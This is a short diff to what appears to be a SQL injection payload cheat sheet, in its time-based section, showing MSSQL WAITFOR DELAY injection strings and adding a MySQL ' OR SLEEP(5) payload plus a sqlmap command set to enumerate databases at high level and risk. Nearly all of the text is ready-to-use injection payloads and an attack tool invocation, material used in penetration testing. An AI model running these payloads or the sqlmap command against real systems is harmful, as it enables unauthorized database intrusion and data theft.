@@ -7,6 +7,10 @@ test;waitfor delay '0:0:10)'-- -  (MSSQL)
 test';WAITFOR DELAY '0:0:10)'-- -  (MSSQL)
 1;WAITFOR DELAY '0:0:5)'-- -  (MSSQL)
 ';WAITFOR DELAY '0:0:5'-- (MSSQL)
+
+
+' OR SLEEP(5) -- - (MYSQL)
+sqlmap -r search.txt --batch --dbs --technique=T --dbms=MySQL --level=3 --risk=3
 ```
 
 ### Boolean
